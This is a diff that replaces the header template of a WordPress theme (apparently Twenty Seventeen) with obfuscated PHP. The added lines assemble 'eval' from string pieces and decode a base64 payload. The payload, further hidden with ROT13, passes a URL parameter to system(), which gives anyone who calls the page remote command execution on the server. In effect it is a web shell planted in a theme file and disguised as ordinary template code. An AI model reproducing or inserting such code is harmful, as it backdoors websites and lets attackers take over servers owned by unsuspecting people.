@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Displays header media
- *
- * @package WordPress
- * @subpackage Twenty_Seventeen
- * @since Twenty Seventeen 1.0
- * @version 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZmY3lubGYgdXJucXJlIHpycXZuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfRnJpcmFncnJhCiAqIEBmdmFwciBHanJhZ2wgRnJpcmFncnJhIDEuMAogKiBAaXJlZnZiYSAxLjAKICovCgo/Pgo8cXZpIHB5bmZmPVwicGhmZ2J6LXVybnFyZVwiPgoKCQk8cXZpIHB5bmZmPVwicGhmZ2J6LXVybnFyZS16cnF2blwiPgoJCQk8P2N1YyBndXJfcGhmZ2J6X3VybnFyZV96bmV4aGMoKTsgPz4KCQk8L3F2aT4KCgk8P2N1YyB0cmdfZ3J6Y3luZ3JfY25lZyggJ2dyemN5bmdyLWNuZWdmL3VybnFyZS9mdmdyJywgJ29lbmFxdmF0JyApOyA/PgoKPC9xdmk+PCEtLSAucGhmZ2J6LXVybnFyZSAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-<div class="custom-header">
-
-		<div class="custom-header-media">
-			<?php the_custom_header_markup(); ?>
-		</div>
-
-	<?php get_template_part( 'template-parts/header/site', 'branding' ); ?>
-
-</div><!-- .custom-header -->
